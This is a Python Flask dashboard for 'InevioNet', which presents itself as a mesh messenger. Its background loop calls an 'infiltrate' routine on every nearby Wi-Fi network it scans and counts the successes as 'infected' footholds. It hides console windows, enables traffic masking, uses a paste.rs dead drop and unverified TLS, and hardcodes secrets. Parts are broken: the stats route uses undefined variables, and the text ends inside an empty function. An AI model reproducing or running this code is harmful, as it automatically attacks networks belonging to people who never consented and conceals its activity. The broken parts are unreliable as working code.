"""
InevioNet Web Dashboard — CLEAN BUILD.
Живая сеть: грибница + ДНК + mesh + мессенджер.
Без SuperNode, без DHT, без seed, без hole_punch, без acks.
"""
import os
import sys
import time
import json
import subprocess
import threading
import re
import random
import socket
import struct
import logging

# === UTF-8 для Windows ===
if sys.platform == 'win32':
    # P54: guard for PyInstaller console=False
    try:
        if sys.stdout is not None and hasattr(sys.stdout, 'reconfigure'):
            sys.stdout.reconfigure(encoding='utf-8', errors='replace')
        if sys.stderr is not None and hasattr(sys.stderr, 'reconfigure'):
            sys.stderr.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass
    os.environ.setdefault('PYTHONIOENCODING', 'utf-8')

import urllib.request as _urlreq
import ssl as _ssl

from flask import Flask, render_template, jsonify, request, send_from_directory
from flask_socketio import SocketIO, emit

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from inevionet import InevioNet, __version__
from inevionet.users import get_user_manager

# ================================================================
# FLASK + SOCKETIO
# ================================================================
app = Flask(__name__, static_folder='static', template_folder='templates')
app.config['SECRET_KEY'] = os.environ.get('INEVIO_WEB_SECRET', 'inevionet_secret_2026')
socketio = SocketIO(
    app,
    async_mode='threading',
    cors_allowed_origins="*",

    manage_session=False,
    logger=False,
    engineio_logger=False,
)

log = logging.getLogger('inevionet.web')

# P59: hide console windows
CREATE_NO_WINDOW = 0x08000000


# ================================================================
# МОСТ ЛОГОВ: Python logging -> console + dashboard
# ================================================================
class SocketLogHandler(logging.Handler):
    def emit(self, record):
        try:
            socketio.emit('server_log', {
                'msg': self.format(record),
                'level': record.levelname,
            })
        except Exception:
            pass


def install_log_bridge():
    fmt = logging.Formatter(
        '[%(asctime)s] [%(levelname)s] %(name)s: %(message)s',
        datefmt='%H:%M:%S',
    )
    root = logging.getLogger('inevionet')
    # P28: file logs with rotation
    try:
        import logging.handlers as _lh
        import pathlib as _pl
        log_dir = _pl.Path(__file__).parent.parent / 'logs'
        log_dir.mkdir(exist_ok=True)
        fh = _lh.RotatingFileHandler(
            str(log_dir / 'inevionet.log'),
            maxBytes=5 * 1024 * 1024, backupCount=3, encoding='utf-8')
        fh.setFormatter(fmt)
        if not any(isinstance(h, _lh.RotatingFileHandler)
                   for h in root.handlers):
            root.addHandler(fh)
    except Exception:
        pass
    # Убираем дубли
    streams = [h for h in root.handlers
               if isinstance(h, logging.StreamHandler)
               and not isinstance(h, SocketLogHandler)]
    for h in streams[1:]:
        root.removeHandler(h)
    # Добавляем мост, если нет
    if not any(isinstance(h, SocketLogHandler) for h in root.handlers):
        sh = logging.StreamHandler(sys.stdout)
        sh.setFormatter(fmt)
        bh = SocketLogHandler()
        bh.setFormatter(fmt)
        root.addHandler(sh)
        root.addHandler(bh)
    root.setLevel(logging.INFO)

# ================================================================
# СОСТОЯНИЕ
# ================================================================
# P57: portable data dir
if getattr(sys, 'frozen', False):
    # EXE: данные в %APPDATA%\InevioNet\data
    _data_home = os.environ.get('INEVIO_DATA_DIR') or os.path.join(
        os.environ.get('APPDATA', os.path.expanduser('~')),
        'InevioNet', 'data')
else:
    # Из исходников: локально
    _data_home = os.path.join(
        os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
        'data')

os.makedirs(_data_home, exist_ok=True)
BASE_DIR = os.path.dirname(_data_home)

# P49/P57: per-port files
_PORT = os.environ.get('INEVIO_PORT', '8080')
STATE_FILE = os.path.join(_data_home, 'web_state_%s.json' % _PORT)
INBOX_FILE = os.path.join(_data_home, 'p2_inbox_%s.json' % _PORT)
_NODE_ID_FILE = os.path.join(_data_home, 'node_id_%s.txt' % _PORT)
_TRUSTED_FILE = os.path.join(_data_home, 'trusted_hosts_%s.json' % _PORT)

state_lock = threading.Lock()
net = None
net_lock = threading.Lock()
discovery_socket = None

# Атомарные ссылки (без deadlock)
_nodes = [{}]           # {node_id: node_dict}
_inbox = [[]]           # [msg, msg, ...]
_footholds = [{}]       # {ssid: method}
_evo_log = [[]]         # [{time, msg}, ...]

def get_nodes():      return _nodes[0]
def set_nodes(d):     _nodes[0] = d
def get_inbox():      return _inbox[0]
def set_inbox(d):     _inbox[0] = d
def get_footholds():  return _footholds[0]
def set_footholds(d): _footholds[0] = d

# ================================================================
# ПЕРСИСТЕНТНОСТЬ
# ================================================================
def load_state():
    try:
        if os.path.exists(STATE_FILE):
            with open(STATE_FILE, 'r', encoding='utf-8') as f:
                d = json.load(f)
            set_footholds(d.get('footholds', {}))
        if os.path.exists(INBOX_FILE):
            with open(INBOX_FILE, 'r', encoding='utf-8') as f:
                set_inbox(json.load(f))
        log.info('[State] загружено: закреплений=%d, входящих=%d',
                 len(get_footholds()), len(get_inbox()))
    except Exception as e:
        log.warning('[State] ошибка загрузки: %s', e)


def save_state():
    try:
        os.makedirs(os.path.dirname(STATE_FILE), exist_ok=True)
        with state_lock:
            d = {'footholds': get_footholds()}
        with open(STATE_FILE, 'w', encoding='utf-8') as f:
            json.dump(d, f, ensure_ascii=False)
        with open(INBOX_FILE, 'w', encoding='utf-8') as f:
            json.dump(get_inbox()[-100:], f, ensure_ascii=False)
    except Exception:
        pass

# ================================================================
# ЯДРО INEVIONET
# ================================================================

def _ensure_i2p_running():
    """P26: start I2P router in background if not running.

    P80: отключено по умолчанию. Включается через INEVIO_I2P_AUTOSTART=1.
    """
    # P80: I2P autostart disabled
    import os as _os
    if _os.environ.get("INEVIO_I2P_AUTOSTART", "0") != "1":
        return
    
    import subprocess as _sp
    import socket as _sock
    # Check if port 7657 open
    try:
        s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
        s.settimeout(1.0)
        r = s.connect_ex(("127.0.0.1", 7657))
        s.close()
        if r == 0:
            log.info("[I2P] already running")
            return True
    except Exception:
        pass

    # Try to start I2P
    i2p_paths = [
        r"C:\Program Files\I2P\i2p.exe",
        r"C:\Program Files (x86)\I2P\i2p.exe",
        r"C:\I2P\i2p.exe",
    ]
    i2p_exe = None
    for p in i2p_paths:
        if os.path.exists(p):
            i2p_exe = p
            break

    if not i2p_exe:
        log.warning("[I2P] i2p.exe not found")
        return False

    try:
        log.info("[I2P] starting %s (detached)", i2p_exe)
        _sp.Popen(
            [i2p_exe],
            stdout=_sp.DEVNULL,
            stderr=_sp.DEVNULL,
            stdin=_sp.DEVNULL,
            creationflags=(_sp.CREATE_NEW_PROCESS_GROUP | _sp.DETACHED_PROCESS | 0x08000000) if sys.platform == "win32" else 0,
            close_fds=True,
        )
        return True
    except Exception as e:
        log.error("[I2P] start failed: %s", e)
        return False


def get_net():
    global net
    with net_lock:
        if net is None:
            # P80: I2P autostart disabled (не используем)
            # try:
            #     _ensure_i2p_running()
            # except Exception as _e:
            #     log.debug('[I2P] autostart error: %s', _e)

            log.info('[Web] инициализация узла InevioNet')
            # P48/P57: persistent node_id (per-port, in _data_home)
            _nid_path = _NODE_ID_FILE
            if os.path.exists(_nid_path):
                with open(_nid_path, 'r', encoding='utf-8') as _f:
                    _node_id = _f.read().strip()
                log.info('[Node] persistent node_id=%s (port %s)', _node_id, _PORT)
            else:
                _node_id = 'web_node_%d' % random.randint(1000, 9999)
                with open(_nid_path, 'w', encoding='utf-8') as _f:
                    _f.write(_node_id)
                log.info('[Node] created new node_id=%s (port %s)', _node_id, _PORT)

            net = InevioNet(
                password='inevio_forever',
                node_id=_node_id,
                auto_start=True,
            )
            for fn in ('enable_masking', 'enable_ambient_masking'):
                try:
                    getattr(net, fn)()
                except Exception:
                    pass
            try:
                net.enable_rf_scanning(interface='Wi-Fi', wifi_provider=scan_wifi)
            except Exception:
                pass
        return net


def upsert(node):
    node['last_seen'] = time.time()
    with state_lock:
        nodes = dict(_nodes[0])
        nodes[node['node_id']] = node
        _nodes[0] = nodes


def snapshot():
    now = time.time()
    with state_lock:
        nodes = dict(_nodes[0])
    # TTL-чистка: убираем старые (кроме self)
    for nid in list(nodes.keys()):
        if nodes[nid].get('type') != 'self' and now - nodes[nid].get('last_seen', now) > 120:
            del nodes[nid]
    return nodes

# ================================================================
# DISCOVERY (multicast)
# ================================================================
def init_discovery_socket():
    global discovery_socket
    try:
        discovery_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        discovery_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            discovery_socket.bind(('', 9555))
        except OSError:
            discovery_socket.bind(('', 9556))
        discovery_socket.settimeout(0.3)
        mreq = struct.pack('4sl', socket.inet_aton('224.0.0.251'), socket.INADDR_ANY)
        discovery_socket.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        log.info('[Discovery] multicast 224.0.0.251:9555 активен')
    except Exception as e:
        log.warning('[Discovery] сокет недоступен: %s', e)
        discovery_socket = None


def send_beacon():
    if not discovery_socket:
        return
    try:
        n = get_net()
        beacon = json.dumps({
            'type': 'inevionet_beacon',
            'node_id': n.node_id,
            'port': 8080,
            'trust': 100.0,
        }).encode('utf-8')
        discovery_socket.sendto(beacon, ('224.0.0.251', 9555))
    except Exception:
        pass


def recv_beacons():
    if not discovery_socket:
        return []
    found = []
    try:
        while True:
            data, addr = discovery_socket.recvfrom(4096)
            try:
                b = json.loads(data.decode('utf-8'))
                if b.get('type') == 'inevionet_beacon':
                    nid = b.get('node_id', '')
                    if nid and nid != get_net().node_id:
                        found.append({
                            'node_id': nid,
                            'name': 'peer ' + nid[:8],
                            'label': 'peer ' + nid[:8],
                            'type': 'peer',
                            'ip': addr[0],
                            'port': b.get('port', 8080),
                            'trust': b.get('trust', 50.0),
                            'packets': 0,
                            'online': True,
                            'rssi': -50,
                            'signal': 80,
                            'method': 'multicast',
                            'evolving': False,
                            'parent': None,
                        })
            except Exception:
                pass
    except socket.timeout:
        pass
    except Exception:
        pass
    return found

# ================================================================
# RF СКАНЕРЫ
# ================================================================
# P13: force wifi rescan
_last_forced_rescan = 0.0
_FORCED_RESCAN_INTERVAL = 300  # P33: 5 min (fallback only)

def _force_wifi_rescan():
    import subprocess as _sp
    import time as _t
    global _last_forced_rescan
    now = _t.time()
    if now - _last_forced_rescan < _FORCED_RESCAN_INTERVAL:
        return False
    try:
        # Get current SSID
        r = _sp.run(['netsh', 'wlan', 'show', 'interfaces'],
                    capture_output=True, timeout=3,
                creationflags=CREATE_NO_WINDOW,
            )
        try:
            raw = r.stdout.decode('cp866', errors='replace')
        except Exception:
            raw = r.stdout.decode('utf-8', errors='replace')
        current_ssid = ''
        for line in raw.splitlines():
            if 'SSID' in line and 'BSSID' not in line and ':' in line:
                parts = line.split(':', 1)
                if len(parts) == 2:
                    current_ssid = parts[1].strip()
                    break
        # Disconnect
        _sp.run(['netsh', 'wlan', 'disconnect'],
                capture_output=True, timeout=3,
                creationflags=CREATE_NO_WINDOW,
            )
        _t.sleep(1.5)
        # Trigger scan
        _sp.run(['netsh', 'wlan', 'show', 'networks'],
                capture_output=True, timeout=5,
                creationflags=CREATE_NO_WINDOW,
            )
        # Reconnect
        if current_ssid:
            _sp.run(['netsh', 'wlan', 'connect', 'name=' + current_ssid],
                    capture_output=True, timeout=5,
                creationflags=CREATE_NO_WINDOW,
            )
        _last_forced_rescan = now
        log.info('[WiFi] forced rescan complete (saved=%s)', current_ssid)
        return True
    except Exception as e:
        log.debug('[WiFi] force rescan error: %s', e)
        return False


def scan_arp():
    """P22: scan ARP table for devices."""
    try:
        from inevionet.network.arp_scanner import scan_arp as _arp
        return _arp()
    except Exception as e:
        log.debug('[ARP] error: %s', e)
        return []


def scan_wifi():
    """P33: pywifi first (8-9 networks), netsh fallback."""
    # 1. pywifi (best)
    try:
        sigs = scan_wifi_pywifi(wait_sec=3.5)
        if len(sigs) >= 3:
            log.debug('[scan_wifi] pywifi: %d networks', len(sigs))
            return sigs
    except Exception as e:
        log.debug('[scan_wifi] pywifi failed: %s', e)

    # 2. netsh fallback
    out = []
    try:
        r = subprocess.run(
            ['netsh', 'wlan', 'show', 'networks', 'mode=bssid'],
            capture_output=True, timeout=5,
            creationflags=CREATE_NO_WINDOW,
        )
        try:
            raw = r.stdout.decode('utf-8')
        except UnicodeDecodeError:
            raw = r.stdout.decode('cp866', errors='replace')
        for block in re.split(r'(?i)\n\s*SSID\s+\d+\s*:\s*', '\n' + raw)[1:]:
            lines = block.split('\n')
            ssid = lines[0].strip() or ''
            if (not ssid
                    or ssid.startswith('Тип сети')
                    or ssid.startswith('Type')
                    or ssid.startswith('BSSID')
                    or ssid == 'Unknown'
                    or len(ssid) > 32):
                continue
            bssid = pct = None
            for ln in lines[1:20]:
                if not bssid:
                    m = re.search(r'([0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2}', ln)
                    if m:
                        bssid = m.group(0)
                if pct is None and '%' in ln:
                    m = re.search(r':\s*(\d+)\s*%', ln)
                    if m:
                        pct = int(m.group(1))
            if bssid:
                out.append({
                    'ssid': ssid,
                    'bssid': bssid,
                    'signal': pct or 0,
                    'rssi_dbm': round(-100 + (pct or 0) / 2.0, 1),
                    'auth': 'unknown',
                    'source': 'netsh',
                })
    except Exception as e:
        log.debug('[Scanner] WiFi: %s', e)

    # 3. if too few — force rescan + retry
    if len(out) < 3:
        try:
            _force_wifi_rescan()
        except Exception:
            pass
        try:
            r = subprocess.run(
                ['netsh', 'wlan', 'show', 'networks', 'mode=bssid'],
                capture_output=True, timeout=5,
            )
            raw = r.stdout.decode('cp866', errors='replace')
            for block in re.split(r'(?i)\n\s*SSID\s+\d+\s*:\s*', '\n' + raw)[1:]:
                lines = block.split('\n')
                ssid = lines[0].strip() or ''
                if (not ssid or ssid.startswith('Тип сети')
                        or ssid.startswith('Type') or len(ssid) > 32):
                    continue
                bssid = None
                for ln in lines[1:20]:
                    m = re.search(r'([0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2}', ln)
                    if m:
                        bssid = m.group(0)
                        break
                if bssid and not any(s['bssid'] == bssid for s in out):
                    out.append({
                        'ssid': ssid, 'bssid': bssid,
                        'signal': 0, 'rssi_dbm': -100,
                        'auth': 'unknown', 'source': 'netsh_rescan',
                    })
        except Exception:
            pass

    return out


# ================================================================
# P31: pywifi — дополнительные WiFi-возможности (scan/connect/status)
# ================================================================
_pywifi_iface = None
_pywifi_lock = None

def _get_pywifi_iface():
    """P31: lazy-init pywifi interface (first adapter)."""
    global _pywifi_iface, _pywifi_lock
    import threading as _th
    if _pywifi_lock is None:
        _pywifi_lock = _th.Lock()
    with _pywifi_lock:
        if _pywifi_iface is None:
            try:
                import pywifi
                w = pywifi.PyWiFi()
                ifaces = w.interfaces()
                if not ifaces:
                    log.warning('[pywifi] no interfaces')
                    return None
                _pywifi_iface = ifaces[0]
                log.info('[pywifi] iface=%s', _pywifi_iface.name())
            except Exception as e:
                log.warning('[pywifi] init error: %s', e)
                return None
        return _pywifi_iface


def scan_wifi_pywifi(wait_sec=4.0):
    """P32: scan WiFi via pywifi (RSSI dBm + auth, dedup, normalized)."""
    try:
        from pywifi import const  # noqa
        iface = _get_pywifi_iface()
        if iface is None:
            return []
        iface.scan()
        import time as _t
        _t.sleep(wait_sec)
        results = iface.scan_results()

        # P33: auth mapping (expanded)
        AUTH_MAP = {
            0: 'OPEN',
            1: 'WPA',
            2: 'WPA2',
            3: 'WPA3',
            4: 'WPA2-ENT',
            5: 'WPA3-ENT',
            6: 'WEP',
            7: '802.1X',
        }

        seen = {}  # P32: dedup by BSSID
        for r in results:
            ssid = (r.ssid or '').strip()
            if not ssid or len(ssid) > 32:
                continue
            # P32: strip trailing ':' and normalize
            bssid = (r.bssid or '').lower().rstrip(':')
            if not bssid or bssid in seen:
                continue
            rssi = int(r.signal) if r.signal else -100
            pct = max(0, min(100, int(2 * (rssi + 100))))
            # P34b-fix: decode auth + fallback
            try:
                if r.auth and isinstance(r.auth, (list, tuple)) and len(r.auth) > 0:
                    auth_code = int(r.auth[0])
                elif r.auth:
                    auth_code = int(r.auth)
                else:
                    auth_code = -1
                auth = AUTH_MAP.get(auth_code)
                if not auth:
                    akm_list = [str(a) for a in (r.akm or [])]
                    akm_str = ' '.join(akm_list).upper()
                    if 'WPA3' in akm_str:
                        auth = 'WPA3'
                    elif 'WPA2' in akm_str:
                        auth = 'WPA2'
                    elif 'WPA' in akm_str:
                        auth = 'WPA'
                    elif 'NONE' in akm_str or 'OPEN' in akm_str:
                        auth = 'OPEN'
                    else:
                        auth = 'unknown'
            except Exception:
                auth = 'unknown'
            seen[bssid] = {
                'ssid': ssid,
                'bssid': bssid,
                'signal': pct,
                'rssi_dbm': round(rssi, 1),
                'auth': auth,
                'source': 'pywifi',
            }
        return list(seen.values())
    except Exception as e:
        log.debug('[pywifi] scan error: %s', e)
        return []


def scan_wifi_combined():
    """P31: pywifi first, netsh fallback. Dedup by BSSID."""
    seen = {}
    # 1. pywifi
    for s in scan_wifi_pywifi():
        key = s['bssid'].replace(':', '').replace('-', '').lower()
        seen[key] = s
    # 2. netsh (only if not seen)
    try:
        for s in scan_wifi():
            key = s['bssid'].replace(':', '').replace('-', '').lower()
            if key not in seen:
                s['source'] = 'netsh'
                seen[key] = s
    except Exception:
        pass
    return list(seen.values())


def scan_bt():
    out = []
    try:
        ps = "Get-PnpDevice -Class Bluetooth | Where-Object {$_.Status -eq 'OK'} | Select-Object Name, InstanceId | ConvertTo-Json"
        r = subprocess.run(
            ['powershell', '-NoProfile', '-NonInteractive', '-WindowStyle', 'Hidden', '-Command', ps],
            capture_output=True, text=True, timeout=5,
            encoding='utf-8', errors='ignore',
            creationflags=CREATE_NO_WINDOW,
        )
        if r.stdout.strip() not in ('', 'null'):
            d = json.loads(r.stdout)
            if isinstance(d, dict):
                d = [d]
            for x in d:
                iid = x.get('InstanceId', '')
                name = x.get('Name', '')
                # P34b-fix: only BTHLEDEVICE (not BTHENUM/BTHLE_DEV)
                if not iid.startswith('BTHLEDEVICE'):
                    continue
                # Skip Windows service records (have GUID in iid)
                if '{' in iid or 'DEV_' in iid:
                    continue
                if not name or len(name) < 3:
                    continue
                # Skip garbled names (mostly non-latin chars)
                latin = sum(1 for c in name if c.isascii() and c.isprintable())
                if latin < 2:
                    continue
                out.append({
                    'name': name,
                    'id': iid.replace('\\', '_'),
                })
    except Exception:
        pass
    return out

# ================================================================
# ФОНОВЫЙ ЦИКЛ: ГРИБНИЦА + ДНК + MESH
# ================================================================
def background_scanner():
    install_log_bridge()
    load_state()
    init_discovery_socket()
    log.info('[Scanner] режим ЖИВОЙ сети: RF + multicast + мицелий + эволюция')
    sc = 0
    while True:
        try:
            socketio.sleep(4)
            sc += 1
            n = get_net()
            now = time.time()

            # --- SELF ---
            upsert({
                'node_id': n.node_id,
                'name': 'Мой узел',
                'label': 'Я: ' + n.node_id,
                'type': 'self',
                'ip': '127.0.0.1',
                'port': 8080,
                'trust': 100.0,
                'packets': n.stats.get('packets_sent', 0),
                'online': True,
                'rssi': -30,
                'signal': 100,
                'method': 'local',
                'evolving': False,
                'parent': None,
            })

            # --- DISCOVERY (каждые 3 цикла) ---
            if sc % 3 == 0:
                send_beacon()
                for p in recv_beacons():
                    upsert(p)

            # --- WIFI + MYCELIUM (каждые 2 цикла) ---
            if sc % 2 == 0:
                myc = getattr(n, 'mycelium', None) or getattr(n, '_mycelium', None)
                footholds = dict(get_footholds())
                for sig in scan_wifi():
                    # P29: normalize BSSID (strip :, lower) to merge with arp_*
                    nid = 'wifi_' + sig['bssid'].replace(':', '').replace('-', '').lower()
                    upsert({
                        'node_id': nid,
                        'name': sig['ssid'],
                        'label': sig['ssid'],
                        'type': 'wifi',
                        'ip': 'unknown',
                        'port': 0,
                        'trust': max(10, min(100, 50 + sig['signal'] / 2.0)),
                        'packets': 0,
                        'online': True,
                        'rssi': sig['rssi_dbm'],
                        'signal': sig['signal'],
                        'method': 'rf_scan',
                        'evolving': False,
                        'parent': n.node_id,
                    })
                    if sig['ssid'] not in footholds and myc is not None:
                        try:
                            ok, method = myc.infiltrate(sig['ssid'], max_attempts=1)
                            if ok:
                                footholds[sig['ssid']] = method or 'unknown'
                                log.info('[Mycelium] закрепление "%s" (%s)', sig['ssid'], method)
                        except Exception:
                            pass
                set_footholds(footholds)

                # СПОРЫ
                for sig in scan_wifi():
                    if sig['ssid'] in footholds:
                        sid = 'spore_' + sig['bssid'].replace(':', '').replace('-', '').lower()  # P29
                        upsert({
                            'node_id': sid,
                            'name': 'spore ' + sig['ssid'],
                            'label': 'spore: ' + sig['ssid'],
                            'type': 'spore',
                            'ip': 'mycelium',
                            'port': 0,
                            'trust': 65.0,
                            'packets': 0,
                            'online': True,
                            'rssi': sig['rssi_dbm'] - 10,
                            'signal': sig['signal'],
                            'method': 'mycelium:' + footholds[sig['ssid']],
                            'evolving': True,
                            'parent': 'wifi_' + sig['bssid'].replace(':', '').replace('-', '').lower(),  # P29
                        })

            # --- ARP DEVICES (каждые 5 циклов = раз в 20 сек) ---
            if sc % 5 == 0:
                try:
                    arp_devices = scan_arp()
                    for dev in arp_devices:
                        nid = 'arp_' + dev['mac'].replace(':', '')
                        upsert({
                            'node_id': nid,
                            'name': '%s (%s)' % (dev['ip'], dev['type']),
                            'label': dev['ip'],
                            'type': dev['type'],
                            'ip': dev['ip'],
                            'port': 0,
                            'trust': 60.0,
                            'packets': 0,
                            'online': True,
                            'rssi': -50,
                            'signal': 80,
                            'method': 'arp_scan',
                            'evolving': False,
                            'parent': None,
                            'mac': dev['mac'],
                        })
                except Exception as _e:
                    log.debug('[ARP] loop error: %s', _e)

            # --- BLUETOOTH (каждые 4 цикла) ---
            if sc % 4 == 0:
                for d in scan_bt():
                    nid = 'bt_' + d['id']
                    upsert({
                        'node_id': nid,
                        'name': d['name'],
                        'label': d['name'],
                        'type': 'bluetooth',
                        'ip': 'unknown',
                        'port': 0,
                        'trust': 40.0,
                        'packets': 0,
                        'online': True,
                        'rssi': -70,
                        'signal': 50,
                        'method': 'rf_scan',
                        'evolving': False,
                        'parent': n.node_id,
                    })

            # --- EVOLUTION (каждые 10 циклов = ~40 сек) ---
            evo_log = []
            if sc % 10 == 0:
                evo = getattr(n, 'evolution', None) or getattr(n, 'evolution_engine', None)
                if evo is not None and hasattr(evo, 'evolve'):
                    try:
                        evo.evolve()
                        st = evo.get_stats()
                        msg = '[Evolution] поколение %s: best=%.3f avg=%.3f diversity=%.3f' % (
                            st.get('generation', '?'),
                            st.get('best_fitness', 0.0),
                            st.get('avg_fitness', 0.0),
                            st.get('diversity', 0.0),
                        )
                        log.info(msg)
                        evo_log.append({'time': now, 'msg': msg})
                        with state_lock:
                            _evo_log[0] = (evo_log + _evo_log[0])[:10]
                    except Exception as e:
                        log.debug('[Evolution] %s', e)

            # --- EMIT ---
            nodes = snapshot()
            socketio.emit('nodes_update', {
                'nodes': nodes,
                'count': len(nodes),
                'timestamp': now,
                'evo_log': evo_log,
                'infected': len(get_footholds()),
            })

            if sc % 5 == 0:
                log.info('[Scanner] узлов=%d, закреплений=%d', len(nodes), len(get_footholds()))
                save_state()

        except Exception as e:
            log.error('[Scanner] ошибка цикла: %s', e)

# ================================================================
# ROUTES
# ================================================================
# P28: capsule receive registry (dedup, single source of truth)
import threading as _th_capsule
_capsule_received: dict = {}
_capsule_received_lock = _th_capsule.Lock()
_autostart_counter = 0
_MAX_AUTOSTART = 10


@app.route('/')
def index():
    return render_template('index.html', version=__version__)


@app.route('/favicon.ico')
def favicon():
    return '', 204


@app.route('/api/nodes')
def api_nodes():
    return jsonify({
        'success': True,
        'nodes': snapshot(),
        'infected': len(get_footholds()),
    })


@app.route('/api/stats')
def api_stats():
    try:
        return jsonify(get_net().get_stats())
    except Exception:
        # P95b: добавить organism
        _stats_org = {}
        try:
            _org = getattr(n, "organism", None)
            if _org is not None:
                _stats_org = _org.get_stats()
        except Exception:
            pass
        result["organism"] = _stats_org
        return jsonify({})


@app.route('/api/spores')
def api_spores():
    nodes = snapshot()
    spores = {k: v for k, v in nodes.items() if v.get('type') == 'spore'}
    return jsonify({'success': True, 'spores': spores, 'count': len(spores)})


@app.route('/api/evolution/log')
def api_evolution_log():
    with state_lock:
        return jsonify({'success': True, 'log': _evo_log[0]})


# --- AUTH ---
@app.route('/api/me')
def api_me():
    try:
        u = get_user_manager().get_current_user()
        if not u:
            return jsonify({'success': False, 'error': 'not_logged_in'}), 401
        # P51: always sync user.node_id with net.node_id
        try:
            n = get_net()
            if u.node_id != n.node_id:
                u.node_id = n.node_id
                get_user_manager()._save()
        except Exception:
            pass
        return jsonify({
            'success': True,
            'user': u.to_dict(),
            'contacts': get_user_manager().get_contacts(),
        })
    except Exception:
        return jsonify({'success': False, 'error': 'no_user_manager'}), 401


@app.route('/api/login', methods=['POST'])
def api_login():
    d = request.json or {}
    try:
        u = get_user_manager().login(d.get('username', '').strip(), d.get('password', ''))
        # P51: sync user.node_id with net.node_id
        try:
            n = get_net()
            if u.node_id != n.node_id:
                u.node_id = n.node_id
                get_user_manager()._save()
                log.info('[User] synced %s.node_id -> %s', u.username, n.node_id)
        except Exception as _se:
            log.debug('[User] sync error: %s', _se)
        return jsonify({'success': True, 'user': u.to_dict(), 'node_id': u.node_id})
    except ValueError as e:
        return jsonify({'success': False, 'error': str(e)}), 401


@app.route('/api/register', methods=['POST'])
def api_register():
    d = request.json or {}
    try:
        u = get_user_manager().register(d.get('username', '').strip(), d.get('password', ''))
        # P51: sync user.node_id with net.node_id
        try:
            n = get_net()
            if u.node_id != n.node_id:
                u.node_id = n.node_id
                get_user_manager()._save()
                log.info('[User] synced %s.node_id -> %s', u.username, n.node_id)
        except Exception as _se:
            log.debug('[User] sync error: %s', _se)
        return jsonify({'success': True, 'user': u.to_dict(), 'node_id': u.node_id})
    except ValueError as e:
        return jsonify({'success': False, 'error': str(e)}), 400


@app.route('/api/logout', methods=['POST'])
def api_logout():
    try:
        get_user_manager().logout()
    except Exception:
        pass
    return jsonify({'success': True})


# --- CONTACTS ---
@app.route('/api/contacts', methods=['GET'])
def api_get_contacts():
    try:
        return jsonify({'success': True, 'contacts': get_user_manager().get_contacts()})
    except Exception:
        return jsonify({'success': True, 'contacts': []})


@app.route('/api/contacts', methods=['POST'])
def api_add_contact():
    d = request.json or {}
    try:
        added = get_user_manager().add_contact(d.get('qr_data', {}))
        return jsonify({
            'success': True,
            'added': added,
            'contacts': get_user_manager().get_contacts(),
        })
    except ValueError as e:
        return jsonify({'success': False, 'error': str(e)}), 400


@app.route('/api/contacts/<node_id>', methods=['DELETE'])
def api_remove_contact(node_id):
    try:
        removed = get_user_manager().remove_contact(node_id)
        return jsonify({'success': removed, 'contacts': get_user_manager().get_contacts()})
    except Exception:
        return jsonify({'success': False}), 500


@app.route('/api/qr')
def api_qr():
    try:
        p = get_user_manager().generate_contact_qr()
        if not p:
            return jsonify({'success': False, 'error': 'no_user'}), 401
        return jsonify({'success': True, 'qr_url': '/qr/' + os.path.basename(p)})
    except Exception:
        return jsonify({'success': False, 'error': 'qr_error'}), 500


@app.route('/qr/<filename>')
def serve_qr(filename):
    try:
        return send_from_directory(str(get_user_manager().users_dir / 'qr_codes'), filename)
    except Exception:
        return 'Not found', 404


# --- P2P ---
@app.route('/api/p2/send', methods=['POST'])
def api_p2_send():
    """P119: отправка через dead_drop (paste.rs) + fallback HTTPS."""
    d = request.get_json(silent=True) or {}
    receiver = (d.get('receiver') or '').strip()
    message = d.get('message', '')
    if not receiver or not message:
        return jsonify({'success': False, 'error': 'empty'}), 400

    n = get_net()
    via = None
    packet_id = None

    # P119: 1. dead_drop (работает через NAT)
    try:
        if getattr(n, "dead_drop", None):
            import json as _j
            payload = _j.dumps({
                "type": "p2_message",
                "sender": n.node_id,
                "receiver": receiver,
                "message": message,
                "ts": time.time(),
            }, ensure_ascii=False)
            url = n.dead_drop.publish_now("broadcast", payload)
            if url:
                via = "dead_drop:" + url[:40]
                log.info("[P2P] sent via dead_drop: %s -> %s", n.node_id, receiver)
    except Exception as e:
        log.warning("[P2P] dead_drop failed: %s", e)

    # P119: 2. Fallback HTTPS
    if not via:
        try:
            target_host = None
            target_port = 8080
            for h in n.trusted_hosts.list_all():
                label = h.get('label', '') or ''
                host = h.get('host', '') or ''
                if label == receiver or host == receiver:
                    if ':' in host:
                        target_host, port_s = host.rsplit(':', 1)
                        target_port = int(port_s)
                    else:
                        target_host = host
                    break
            if target_host:
                payload = json.dumps({
                    'sender': n.node_id, 'message': message,
                    'ts': time.time(), 'secure': True,
                }).encode('utf-8')
                ctx = _ssl._create_unverified_context()
                for scheme in ('https', 'http'):
                    try:
                        url = '%s://%s:%s/api/p2/inbox' % (scheme, target_host, target_port)
                        req = _urlreq.Request(url, data=payload,
                                              headers={'Content-Type': 'application/json'})
                        _urlreq.urlopen(req, timeout=5, context=ctx)
                        via = scheme + ":" + target_host
                        break
                    except Exception:
                        continue
        except Exception as e:
            log.debug("[P2P] HTTPS: %s", e)

    # P119: 3. Fallback n.send
    if not via:
        try:
            packet = n.send(receiver, message)
            if packet:
                packet_id = getattr(packet, 'packet_id', None)
                via = "cascade"
        except Exception:
            pass

    return jsonify({
        'success': bool(via),
        'via': via,
        'packet_id': packet_id,
    })


@app.route('/api/p2/inbox', methods=['GET'])
def api_p2_inbox_get():
    return jsonify({'success': True, 'messages': list(get_inbox())})


@app.route('/api/p2/inbox', methods=['POST'])
def api_p2_inbox_post():
    d = request.json or {}
    msg = {
        'sender': d.get('sender', 'unknown'),
        'message': d.get('message', ''),
        'ts': d.get('ts', time.time()),
        'secure': bool(d.get('secure')),
    }
    with state_lock:
        box = list(_inbox[0])
        box.append(msg)
        _inbox[0] = box[-100:]
    log.info('[P2] входящее от %s: %s', msg['sender'], msg['message'][:60])
    socketio.emit('inbox_new', msg)
    save_state()
    return jsonify({'success': True})



@app.route('/api/probe', methods=['POST'])
def api_probe():
